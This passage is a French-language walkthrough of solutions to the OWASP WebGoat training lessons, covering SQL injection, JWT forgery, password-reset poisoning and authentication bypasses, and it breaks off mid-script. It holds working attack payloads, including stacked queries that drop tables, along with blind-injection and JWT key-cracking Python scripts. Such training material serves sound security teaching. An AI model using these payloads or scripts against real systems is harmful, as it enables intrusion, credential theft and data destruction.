*Written by Pierre-Arnaud Laporte* 

*Read this in other languages: [English]((Almost)-Fully-Documented-Solution-(en)).*

- [**Introduction:**](#introduction)
  * [WebGoat](#webgoat)
  * [WebWolf](#webwolf)
- [**General:**](#general)
  * [HTTP Basics](#http-basics)
  * [HTTP Proxies](#http-proxies)
  * [CIA triad](#cia-triad)
  * [Google Chrome Developer Tools](#google-chrome-developer-tools)
- [**(A1) Injection:**](#a1-injection)
  * [SQL Injection (introduction)](#sql-injection-introduction)
  * [SQL Injection (advanced)](#sql-injection-advanced)
  * [SQL Injection (mitigation)](#sql-injection-mitigation)
- [**(A2) Broken Authentification:**](#a2-broken-authentification)
  * [Secure Passwords](#secure-passwords)
  * [Password reset](#password-reset)
  * [Authentification Bypasses](#authentification-bypasses)
  * [JWT tokens](#jwt-tokens)
- [**(A3) Sensitive Data Exposure:**](#a3-sensitive-data-exposure)
  * [Insecure Login](#insecure-login)
- [**(A4) XML External Entities (XXE):**](#a4-xml-external-entities-xxe)
  * [XXE](#xxe)
- [**(A5) Broken Access Control:**](#a5-broken-access-control)
  * [Insecure Direct Object References](#insecure-direct-object-references)
  * [Missing Function Level Access Control](#missing-function-level-access-control)
- [**(A7) Cross-Site Scripting (XSS):**](#a7-cross-site-scripting-xss)
  * [Cross Site Scripting](#cross-site-scripting)
  * [Cross Site Scripting (stored)](#cross-site-scripting-stored)
  * [Cross Site Scripting (mitigation)](#cross-site-scripting-mitigation)
- [**(A8) Insecure Deserialization:**](#a8-insecure-deserialization)
  * [Insecure Deserialization](#insecure-deserialization)
- [**(A9) Vulnerable Components:**](#a9-vulnerable-components)
  * [Vulnerable Components](#vulnerable-components)
- [**(A8:2013) Request Forgery:**](#a8-2013-request-forgery)
  * [Cross-Site Request Forgeries](#cross-site-request-forgeries)
  * [Server-Side Request Forgeries](#server-side-request-forgeries)
- [**Client side:**](#client-side)
  * [Bypass front-end restrictions](#bypass-front-end-restrictions)
  * [HTML tampering](#html-tampering)
  * [Client side filtering](#client-side-filtering)
- [**Challenges:**](#challenges)
  * [Admin lost password](#admin-lost-password)
  * [Without password](#without-password)
  * [Creating a new account](#creating-a-new-account)
  * [Admin password reset](#admin-password-reset)
  * [Without account](#without-account)

#### **Introduction:**

##### WebGoat

1. 
Lire la leçon.

##### WebWolf

3.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Un bug sur WebWolf empêche d'accéder à la _Mailbox_.

*   Envoyer un email à `{utilisateur}@...`.
*   Aller sur http://host:port/WebWolf.
*   S'identifer puis aller lire le mail reçu.

4.
*   Cliquer sur **Click here to reset your password** et rentrer n'importe quel mot de passe.
*   Aller sur http://host:port/WebWolf/requests.
*   Observer dans la requête le paramètre `uniqueCode` et rentrer se valeur sur **WebGoat**.

#### **General:**

##### HTTP Basics

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Type in your name and press 'go'

Entrer un nom et appuyer sur **Go!**.  

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Turn on Show Parameters or other features  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to intercept the request with OWASP ZAP

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Remplir les champs sur **WebGoat** avec `POST` ou `GET` et un nombre aléatoire, et cliquer sur **Go!**.
*   Repérer la requête vers `attack2` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_.
*   Récupérer le `magic_num` dans le corps de la requête, repérer que la requête est un `POST` et recliquer sur **Go!** avec les bons paramètres.

![HTTP Basics](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/http-basics.png)

##### HTTP Proxies

6.
*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Cliquer sur **Submit** en laissant le paramètre intact.
*   Repérer la requête vers `intercept-request` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_.
*   Changer la méthode de `POST` à `GET`.
*   Changer l'URL de http://host:port/WebGoat/HttpProxies/intercept-request à [](http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily)http://host:port/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily.
*   Ajouter dans les en-têtes de requête `x-request-intercepted:true`.
*   Effacer le corps de la requête.

![HTTP Proxies](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/http-proxies.png)

##### CIA triad

5.
**1. How could an intruder harm the security goal of confidentiality?**

Solution 3: By stealing a database where names and emails are stored and uploading it to a website.

**2. How could an intruder harm the security goal of integrity?**

Solution 1: By changing the names and emails of one or more users stored in a database.

**3. How could an intruder harm the security goal of availability?**

Solution 4: By launching a denial of service attack on the servers.

**4. What happens if at least one of the CIA security goals is harmed?**

Solution 2: The systems security is compromised even if only one goal is harmed.

##### Google Chrome Developer Tools

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Console_.
*   Dans la console, entrer `webgoat.customjs.phoneHome()`.

![Google Chrome Dev Tools 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/google-chrome-dev-tools-4.png)

6.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Contrairement à ce que les indices disent, la requête ne s'appelle pas `dummy`, mais `network`.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Clear all Requests from the network button, then make the request. The you should be able to figure out, which request holds the data.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The name of the request is "dummy"

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, cliquer sur **Go!**.
*   Repérer la requête vers `network` dans l'onglet _Réseau_ et cliquer sur _Paramètres_.

![Google Chrome Dev Tools 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/google-chrome-dev-tools-6.png)

#### **(A1) Injection:**

##### SQL Injection (introduction)

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You want the data from the column with the name department. You know the database name (employees) and you know the first- and lastname of the employee (first\_name, last\_name).  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) SELECT column FROM tablename WHERE condition;  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use ' instead of " when comparing two strings.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Pay attention to case sensitivity when comparing two strings.

**SQL query**: `SELECT department FROM employees WHERE first_name='Bob'`

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try the UPDATE statement  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) UPDATE table name SET column name=value WHERE condition;

**SQL query**: `UPDATE employees SET department='Sales' WHERE first_name='Tobi'`

4.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) ALTER TABLE alters the structure of an existing database  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Do not forget the data type of the new column (e.g. varchar(size) or int(size))  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) ALTER TABLE table name ADD column name data type(size);

**SQL query**: `ALTER TABLE employees ADD phone varchar(20)`

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the example. There is everything you will need.

**SQL query**: `GRANT ALTER TABLE TO UnauthorizedUser`

9.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember that for an successful Sql-Injection the query needs to always evaluate to true.

**SELECT \* FROM users\_data FIRST\_NAME = 'John' and Last\_NAME = '** `'` + `or` + `'1'='1`

10.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to check which of the input fields is susceptible to an injection attack.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Insert: 0 or 1 = 1 into the first input field. The output should tell you if this field is injectable.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The first input field is not susceptible to sql injection.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You do not need to insert any quotations into your injection-string.

*   **Login\_count**: `0`
*   **User\_Id**: `0 OR 1=1`

11.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The application is taking your input and inserting the values into the variables 'name' and 'auth\_tan' of the pre-formed SQL command.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Compound SQL statements can be made by expanding the WHERE clause of the statement with keywords like AND and OR.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try appending a SQL statement that always resolves to true.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure all quotes (" ' ") are opened and closed properly so the resulting SQL query is syntactically correct.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try extending the WHERE clause of the statement by adding something like: ' OR '1' = '1.

*   **Employee Name**: `A`
*   **Authentication TAN**: `' OR '1' = '1`

12.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to find a way, to chain another query to the end of the existing one.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use the ; metacharacter to do so.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make use of DML to change your salary.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure that the resulting query is syntactically correct.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) How about something like '; UPDATE employees....

*   **Employee Name**: `A`
*   **Authentication TAN**: `'; UPDATE employees SET salary=99999 WHERE first_name='John`

13.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use the techniques that you have learned before.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The application takes your input and filters for entries that are LIKE it.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try query chaining to reach the goal.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The DDL allows you to delete (DROP) database tables.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The underlying SQL query looks like that: "SELECT \* FROM access\_log WHERE action LIKE '%" + action + "%'".  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember that you can use the -- metacharacter to comment out the rest of the line.

**Action contains**: `%'; DROP TABLE access_log;--`

##### SQL Injection (advanced)

3.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember that when using an UNION each SELECT statement within UNION must have the same number of columns.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The data type of a column in the first SELECT statement must have a similar data type to that in the second SELECT statement.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Your new SQL query must end with a comment. eg: --  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) If a column needs a String you could substitute something like 'a String' for it. For integers you could substitute a 1.

*   Name: `'; SELECT * FROM user_system_data;--` ou `' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--` Name: `';
*   Password: `passW0rD`

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the different response you receive from the server  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The vulnerability is on the register form  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The vulnerable field is the username field of the register form.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use tooling to automate this attack  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The table name is randomized at each start of WebGoat, try to figure out the name first.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Change the password through an UPDATE Statement.

Comme spécifié dans les indices, il est possible de changer le mot de passe à l'aide d'un `UPDATE`. Il est aussi possible de retrouver le mot de passe d'origine comme nous allons le voir dans la solution proposée. As specified in the hints, it is possible to change the password using an `UPDATE`. It is also possible to find the original password as we will see in the proposed solution.

*   Le formulaire **Login** ne semble pas fournir de résultats utiles à partir de diverses entrées, mais le formulaire **Register** nous permet de vérifier si un nom d'utilisateur existe déjà.
*   Si nous essayons de nous inscrire avec le nom d'utilisateur suivant: `tom' AND '1'='1` nous constatons que le nom d'utilisateur est pris.
*   Nous pouvons utiliser cela comme un oracle et vérifier le mot de passe de Tom, une lettre à la fois.
*   La table que nous recherchons s'appelle `password` (_guessing_), nous pouvons donc essayer de nous enregistrer avec le nom d'utilisateur suivant : `tom' AND substring(password, 1,1)='t`.
*   La réponse indique que le nom d'utilisateur existe déjà, nous savons que **t** est le premier caractère du mot de passe de Tom.
*   En _fuzzing_ pour les caractères restants, nous pouvons déterminer que le mot de passe de Tom est **thisisasecretfortomonly**.

Ce challenge peut être un bon exercice pour s'entraîner au scripting. Ci-dessous, un petit exemple de code Python permettant de retrouver la réponse:

```python
import json  
import requests  
  
def sql_injection_advance_5():  
     alphabet_index = 0  
     alphabet = 'abcdefghijklmnopqrstuvwxyz'  
     password_index = 0  
     password = ''  
  
     headers = {  
        'Cookie': COOKIE,  
     }  
  
     while True:  
         payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])  
  
         data = {  
             'username_reg': payload,  
             'email_reg': 'a@a',  
             'password_reg': 'a',  
             'confirm_password_reg': 'a'  
         }  
  
         r = requests.put('http://HOST:PORT/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
  
         try:  
             response = json.loads(r.text)  
         except:  
             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
             return  
  
         if "already exists please try to register with a different username" not in response['feedback']:  
             alphabet_index += 1  
             if alphabet_index > len(alphabet) - 1:  
                 return  
         else:  
             password += alphabet[alphabet_index]  
             print(password)  
             alphabet_index = 0  
             password_index += 1  
  
sql_injection_advance_5()
```  

![SQLi Advanced 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/sqli-advanced-5.png)

6.

**1. What is the difference between a prepared statement and a statement?**

Solution 4: A statement has got values instead of a prepared statement

**2. Which one of the following characters is a placeholder for variables?**

Solution 3: ?

**3. How can prepared statements be faster than statements?**

Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.

**4. How can a prepared statement prevent SQL-Injection?**

Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.

**5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?**

Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.

##### SQL Injection (mitigation)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) First establish a connection, after that you can create a statement.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) SqlStringInjectionHint-mitigation-10a-10a2

Les cases doivent contenir les mots suivants pour valider la leçon : `getConnection`, `PreparedStatement`, `prepareStatement`, `?`, `?`, `setString`, `setString`.  

![SQLi Mitigation 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/sqli-mitigation-5.png)

6.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) A database connection has to be surrounded by a try-catch block to handle the very common case of an error while establishing the connection.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Remember to use the right kind of statement, so your code is no longer vulnerable for SQL injections.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The wildcard symbol '?' in a prepared statement can be filled with the right kind of method. There exists one for every data type.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Make sure to execute your statement.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) View the previous lesson to check back on how you can build set up a connection.

Compléter la fenêtre avec :

```java
try {  
     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
     ps.setString(1, "Admin");  
     ps.executeUpdate();  
} catch (Exception e) {  
     System.out.println("Oops. Something went wrong!");  
}
```

![SQLi Mitigation 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/sqli-mitigation-6.png)

10.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Leçon buggée avec la dernière version, l'appel vers http://localhost:8080/WebGoat/SqlInjection/servers renvoie une erreur.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try sorting and look at the request  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Intercept the request and try to specify a different order by  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Use for example "(case when (true) then hostname else id end)" in the order by and see what happens

*   Trier les colonnes (par IP par exemple) effectue une requête vers http://localhost:8080/WebGoat/SqlInjection/servers?column=ip. Cela peut être exploité en interceptant la requête avec les outils de développement du navigateur et en fournissant une requête SQL comme valeur de colonne.
*   Pour avoir une idée de l'adresse IP de **webgoat-prd**, il faut trouver le nom des colonnes dans les tables pour les noms de serveur et les IP. La supposition évidente est **servers** and **ip**.  
    `column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
*   Si les noms de table sont corrects, le tableau devrait être trié par **ids**.
*   C'est le cas, la supposition était donc correcte.
*   Afin de tester la logique on peut essayer de déclencher une erreur avec :  
    `column=(CASE WHEN (SELECT ip FROM whatever WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)`
*   On tombe sur une page d'erreur, on a tout pour écrire le script maintenant.
  
```python
import json  
import requests  
  
def sql_injection_mitigation_10():  
	 index = 0  
  
	 headers = {  
		 'Cookie': COOKIE,
	 }  
  
	 while True:  
		 payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)  
  
		 r = requests.get('http://host:port/WebGoat/SqlInjection/servers?column=' + payload, headers=headers)  
  
		 try:  
			 response = json.loads(r.text)  
		 except:  
			 print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
			 return  
  
		 if response[0]['id'] == '1':  
			 print('webgoat-prd IP: {}.130.219.202'.format(index))  
			 return  
		 else:  
			 index += 1  
			 if index > 255:  
				 print("No IP found")  
				 return  
  
sql_injection_mitigation_10()
```

#### **(A2) Broken Authentification:**

##### Secure Passwords

4. 
La vérification utilise la bibliothèque https://github.com/dropbox/zxcvbn pour vérifier la force du mot de passe.

##### Password reset

2.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Un bug sur WebWolf empêche d'accéder à la _Mailbox_.

*   Cliquer sur **Forgot your password?**.
*   Renseigner l'adresse mail `{utilisateur}@...`
*   Ouvrir le mail sur **WebWolf** afin de récupérer le nouveau mot de passe.

4. Les identifiants valides sont: **admin** et **green**, **jerry** et **orange**, **tom** et **purple**, **larry** et **yellow**.

5. Lire les différents conseils.

6.
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Try to send a password reset link to your own account at {user}@webgoat.org, you can read this e-mail in WebWolf.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Look at the link, can you think how the server creates this link?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Tom clicks all the links he receives in his mailbox, you can use the landing page in WebWolf to get the reset link...  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The link points to localhost:8080/PasswordReset/.... can you change the host to localhost:9090?  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Intercept the request and change the host header.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) For intercepting the request you have to use a proxy. Check the HTTP-Proxies Lesson in the general category if you're unfamiliar with using proxies. Important: There seem to be problems when modifying the request header with ZAP. We recommend to use Burp instead.

*   Envoyer un mail à `tom@webgoat-cloud.org` et intercepter la requête.
*   Modifier l'en-tête `Host: host:webgoat_port` en `Host: host:webwolf_port` et renvoyer une requête.
*   Sur **WebWolf**, aller dans **Incoming requests**, récupérer la variable `path` et aller à l'URL http://host:webgoat\_port/WebGoat/path.
*   Changer le mot de passe et valider le challenge avec ce dernier.
 
![Password Reset 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/password-reset-6.png)  
![Password Reset 6](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/password-reset-6-webwolf.png)

##### Authentification Bypasses

2.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The attack on this is similar to the story referenced, but not exactly the same.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) You do want to tamper the security question parameters, but not delete them  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) The logic to verify the account does expect 2 security questions to be answered, but there is a flaw in the implementation  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Have you tried renaming the secQuestion0 and secQuestion1 parameters?

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Cliquer sur **Submit** sans rentrer de paramètres.
*   Repérer la requête vers `verify-account` dans l'onglet _Réseau_ et cliquer sur _Modifier et renvoyer_.
*   Modifier les paramètres `secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid` en `secQuestion2=&secQuestion3=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=yourid`.

![Authentification Bypass](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/authentification-bypass-2.png)

##### JWT tokens

4.  
![Warning](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/warning.png)  Le numéro de leçon ne devient pas vert après validation.

![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Select a different user and look at the token you receive back, use the delete button to reset the votes count  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Decode the token and look at the contents  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Change the contents of the token and replace the cookie before sending the request for getting the votes  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Change the admin field to true in the token  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Submit the token by changing the algorithm to None and remove the signature

*   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Réseau_.
*   Sur WebGoat, se connecter avec Tom et cliquer sur **Reset Votes**.
*   Repérer la requête vers `reset` dans l'onglet _Réseau_ et cliquer sur _En-têtes_.
*   Remarquer l'en-tête : 
```
Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZm
Fsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQ
uTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA
```
*   En base64, cela se décode en : `{"alg":"HS512"}.{"iat":1564402244,"admin":"false","user":"Tom"}.signature`.
*   Le modifier en `{"alg":null}.{"iat":1564402244,"admin":"true","user":"Tom"}.`.
*   Le ré-encoder en base64 (`eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.`).
*   Cliquer sur _Modifier et Renvoyer_, modifier le cookie avec la nouvelle valeur générée, et renvoyer la requête.

![JWT 4](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-4.png)

![JWT 5](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/jwt-5-2.png)

5.  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Save the token and try to verify the token locally  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Download a word list dictionary (https://github.com/first20hours/google-10000-english)  
![Hint](https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/hint.png) Write a small program or use HashCat for brute forcing the token according the word list

Il est possible d'effectuer ce challenge à l'aide d'outils tels que **johntheripper** et https://jwt.io/, mais afin de mieux comprendre voilà un petit script Python.

*   Isoler la signature, et la reformater correctement.
*   Utiliser chaque mot du dictionnaire comme clé, calculer le HMAC du message initial, le convertir en base64, et comparer avec la signature.
*   S'il y a correspondance, le mot du dictionnaire correspond à la clé (valeur trouvée : **victory**).
*   Calculer alors la nouvelle signature avec le message modifié :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJ
pYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ
0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0LmN
vbSIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.dImA6LEwQc1-ZqVP
WWGE01u1jO2a-yfx8lZetbDqiTc
```

```python
import base64  
import hashlib  
import hmac  
  
def jwt_tokens_5():  
     token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'.split('.')  
  
     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'.encode()  
  
     unsigned_token = (token[0] + '.' + token[1]).encode()  
  
     # signature is base64 URL encoded and padding has been removed, so we must add it  
     signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()  
  
